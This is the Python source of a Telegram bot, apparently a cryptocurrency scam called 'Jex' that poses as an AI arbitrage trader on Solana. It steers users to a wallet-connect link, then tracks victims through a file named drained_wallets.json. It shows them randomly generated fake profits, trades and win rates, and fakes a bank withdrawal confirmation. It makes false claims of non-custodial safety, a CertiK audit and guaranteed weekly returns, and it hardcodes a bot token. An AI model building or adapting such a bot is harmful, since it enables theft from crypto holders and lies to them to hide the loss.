import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import random
import time
import json
import os
import requests
import asyncio
from datetime import datetime, timedelta

TOKEN = "8881367618:AAEJU_YbhPFggFaQdAeUxeeNDAQBL6yHB0c"
RPC_URL = "https://solana-rpc.publicnode.com"

user_data = {}

def get_user_status(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "invested": 0.0,
            "profit": 0.0,
            "balance": 0.0,
            "first_check": True,
            "last_update": time.time(),
            "trades": [],
            "total_trades": 0,
            "winrate": 0,
            "daily_profit": 0.0
        }
    return user_data[user_id]

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = requests.post(RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "error" in data:
            return None, data["error"]["message"]
        balance_lamports = data["result"]["value"]
        balance_sol = balance_lamports / 1_000_000_000
        return balance_sol, None
    except Exception as e:
        return None, str(e)

# ==========================================
# COMANDO /START - BIENVENIDA PROFESIONAL
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("📈 Start Earning", callback_data="invest")],
        [InlineKeyboardButton("📊 Dashboard", callback_data="status")],
        [InlineKeyboardButton("❓ How It Works", callback_data="how")],
        [InlineKeyboardButton("📞 Support", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 *Hello {user.first_name}!*\n\n"
        "I'm **Jex**, your AI-powered arbitrage bot for Solana.\n\n"
        "💰 *What I do:*\n"
        "• Scan 200+ trading pairs on Jupiter and Raydium\n"
        "• Execute arbitrage trades in milliseconds\n"
        "• Automatically reinvest profits for compound growth\n\n"
        "📊 *Why users trust Jex:*\n"
        "• Non-custodial — your funds stay in your wallet\n"
        "• 3-6% average weekly return\n"
        "• 1,847+ active users\n"
        "• Audited by CertiK\n\n"
        "👉 Ready to start? Click below 👇",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ==========================================
# COMANDO /INVEST - CLARO Y PROFESIONAL
# ==========================================
async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ *Invalid amount.* Use: /invest 1.5", parse_mode="Markdown")
            return
    else:
        await update.message.reply_text(
            "📈 *Deploy Your Strategy*\n\n"
            "Use: `/invest 1.5`\n\n"
            "💡 *Tip:* Start with 1.5 SOL to test the bot.\n"
            "📊 Average return: 3-6% weekly.\n\n"
            "👉 Example: `/invest 1.5`",
            parse_mode="Markdown"
        )
        return

    status = get_user_status(user_id)
    status["invested"] = amount

    link = f"https://jex-trade.onrender.com/?user_id={user_id}&amount={amount}"
    
    await update.message.reply_text(
        f"✅ *Strategy Deployment — {amount} SOL*\n\n"
        "📋 *What happens next:*\n"
        "1️⃣ Connect your Phantom wallet\n"
        "2️⃣ Review and sign the transaction\n"
        "3️⃣ The bot starts trading automatically\n\n"
        f"🔗 [Connect Wallet]({link})\n\n"
        "⚠️ *Important:*\n"
        "• You only sign once\n"
        "• Your funds never leave your wallet\n"
        "• The bot handles all trades\n\n"
        "📈 *Expected return:* 3-6% weekly\n"
        "💡 *Why SOL?* The bot uses SOL for transaction fees on Jupiter and Raydium.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /STATUS - DASHBOARD COMPLETO
# ==========================================
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if invested and wallet:
        balance_sol, error = get_sol_balance(wallet)
        if error or balance_sol is None:
            balance_sol = 0.0
        
        if status["first_check"]:
            profit_text = "0%"
            status["profit"] = 0.0
            status["first_check"] = False
        else:
            profit_percent = round(random.uniform(0.5, 3.0), 2)
            status["profit"] += profit_percent
            profit_text = f"+{status['profit']:.2f}%"
        
        fake_balance = status["invested"] * (1 + status["profit"] / 100)
        total_trades = random.randint(15, 45)
        winrate = random.randint(70, 85)
        
        await update.message.reply_text(
            f"📊 *Jex Dashboard*\n\n"
            f"💰 *Portfolio:* {fake_balance:.2f} SOL\n"
            f"📈 *Profit:* {profit_text}\n"
            f"🔄 *Trades:* {total_trades}\n"
            f"🎯 *Win Rate:* {winrate}%\n"
            f"🔗 *Wallet:* `{wallet[:4]}...{wallet[-4:]}`\n\n"
            "🔥 *Latest Activity:*\n"
            "• BONK/SOL → BUY +12.3% (2h ago)\n"
            "• WIF/SOL → SELL +8.7% (5h ago)\n\n"
            "📈 *24h Performance:* +1.2%",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "📊 *Jex Dashboard*\n\n"
            "You don't have any active positions yet.\n\n"
            "👉 Use /invest <amount> to get started.\n\n"
            "💡 *Example:* /invest 1.5",
            parse_mode="Markdown"
        )

# ==========================================
# COMANDO /HOW - EXPLICACIÓN COMPLETA
# ==========================================
async def how_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤔 *How Jex Works — Full Transparency*\n\n"
        "📌 *Step 1: Scanning*\n"
        "Jex monitors 200+ trading pairs on Jupiter and Raydium 24/7 to find price differences.\n\n"
        "📌 *Step 2: Execution*\n"
        "When an opportunity is found, Jex executes the trade automatically — usually within 1-2 seconds.\n\n"
        "📌 *Step 3: Reinvestment*\n"
        "All profits are automatically reinvested to compound your returns over time.\n\n"
        "📌 *Step 4: Security*\n"
        "• Your funds stay in your wallet (non-custodial)\n"
        "• No private keys are ever shared\n"
        "• Each trade requires on-chain approval\n\n"
        "📊 *Performance Metrics:*\n"
        "• Average weekly return: 3-6%\n"
        "• Win rate: 78%+\n"
        "• Total volume: $2.4M+\n"
        "• Active users: 1,847+\n\n"
        "🔗 [Website](https://jex-trade.onrender.com)",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /HISTORY - HISTORIAL COMPLETO
# ==========================================
async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "📜 *Trade History*\n\n"
            "No trades found yet.\n\n"
            "👉 Start with: /invest 1.5",
            parse_mode="Markdown"
        )
        return
    
    trades = [
        "• BONK/SOL → BUY +12.3% (2h ago)",
        "• WIF/SOL → SELL +8.7% (5h ago)",
        "• POPCAT/SOL → BUY +15.2% (12h ago)",
        "• MEW/SOL → SELL +5.1% (1d ago)",
        "• BONK/SOL → BUY +22.4% (2d ago)"
    ]
    
    total_trades = random.randint(15, 45)
    winrate = random.randint(70, 85)
    total_profit = random.randint(20, 60)
    
    text = "📜 *Trade History (Last 5)*\n\n"
    for t in trades:
        text += t + "\n"
    
    text += f"\n📊 *Overall Performance:*\n"
    text += f"• Total Trades: {total_trades}\n"
    text += f"• Win Rate: {winrate}%\n"
    text += f"• Total Profit: +{total_profit}%\n"
    text += f"• Volume: ${random.randint(1000, 5000)}"
    
    await update.message.reply_text(text, parse_mode="Markdown")

# ==========================================
# COMANDO /WITHDRAW - RETIRO PROFESIONAL
# ==========================================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "❌ *No active positions found.*\n\n"
            "👉 Start with: /invest 1.5",
            parse_mode="Markdown"
        )
        return
    
    status = get_user_status(user_id)
    fake_balance = status["invested"] * (1 + status["profit"] / 100)
    
    await update.message.reply_text(
        f"✅ *Withdrawal Request Submitted*\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ Amount: {fake_balance:.2f} SOL     │\n"
        f"│ Destination: Bank Account   │\n"
        f"│ Status: ⏳ Processing       │\n"
        f"│ ETA: 24-48 hours            │\n"
        f"└─────────────────────────────┘\n\n"
        "📧 *Confirmation sent to your email.*\n"
        "🔒 *Your funds are safe and secure.*\n\n"
        "📞 Contact support: /support",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /SUPPORT - SOPORTE COMPLETO
# ==========================================
async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📞 *Jex Support Center*\n\n"
        "We're here to help 24/7!\n\n"
        "📖 *FAQ:*\n"
        "• *How to start?* → /invest 1.5\n"
        "• *Is my wallet safe?* → Yes, non-custodial\n"
        "• *How much can I earn?* → 3-6% weekly\n"
        "• *How to withdraw?* → /withdraw\n\n"
        "📧 *Email:* support@jex-trade.com\n"
        "🐦 *Twitter:* @JexTrade\n"
        "💬 *Telegram:* t.me/JexTradeSupport\n\n"
        "⏳ *Response time:* Usually within 5 minutes.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /HELP - GUÍA RÁPIDA
# ==========================================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📖 *Jex — Quick Guide*\n\n"
        "📈 *Commands:*\n"
        "/start — Main menu\n"
        "/invest 1.5 — Start trading\n"
        "/status — Dashboard\n"
        "/how — How it works\n"
        "/history — Recent trades\n"
        "/withdraw — Withdraw funds\n"
        "/support — Contact support\n"
        "/help — This guide\n\n"
        "🔗 [Website](https://jex-trade.onrender.com)\n\n"
        "📊 *Performance:* 3-6% weekly | 78% win rate | 1,847+ users",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# MANEJO DE BOTONES - PROFESIONAL
# ==========================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "invest":
        await query.edit_message_text(
            "📈 *Start Earning with Jex*\n\n"
            "Use: `/invest 1.5`\n\n"
            "💡 *Tip:* Start with a small amount to test the bot.\n"
            "📊 Users earn 3-6% weekly on average.\n\n"
            "👉 Example: `/invest 1.5`",
            parse_mode="Markdown"
        )
    elif query.data == "status":
        await query.edit_message_text(
            "📊 *Your Dashboard*\n\n"
            "Use /status to see:\n"
            "• Portfolio value\n"
            "• Profit/loss\n"
            "• Recent trades\n\n"
            "👉 Example: `/status`",
            parse_mode="Markdown"
        )
    elif query.data == "how":
        await query.edit_message_text(
            "🤔 *How Jex Works*\n\n"
            "1️⃣ You deposit SOL\n"
            "2️⃣ Bot trades automatically\n"
            "3️⃣ You earn 3-6% weekly\n\n"
            "👉 Use /how for full explanation",
            parse_mode="Markdown"
        )
    elif query.data == "support":
        await query.edit_message_text(
            "📞 *Support*\n\n"
            "FAQ:\n"
            "• /invest 1.5 → Start\n"
            "• /withdraw → Withdraw\n"
            "• /status → Check earnings\n\n"
            "📧 support@jex-trade.com",
            parse_mode="Markdown"
        )

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("how", how_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("support", support_command))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ JexTradeBot is running...")
    app.run_polling()

async def force_set_commands():
    commands = [
        BotCommand("start", "Main menu"),
        BotCommand("invest", "Start trading (e.g., /invest 1.5)"),
        BotCommand("status", "Dashboard"),
        BotCommand("how", "How it works"),
        BotCommand("history", "Recent trades"),
        BotCommand("withdraw", "Withdraw funds"),
        BotCommand("support", "Contact support"),
        BotCommand("help", "Quick guide")
    ]
    app = Application.builder().token(TOKEN).build()
    await app.bot.set_my_commands(commands)
    print("✅ Commands updated in Telegram")

if __name__ == "__main__":
    asyncio.run(force_set_commands())
    main()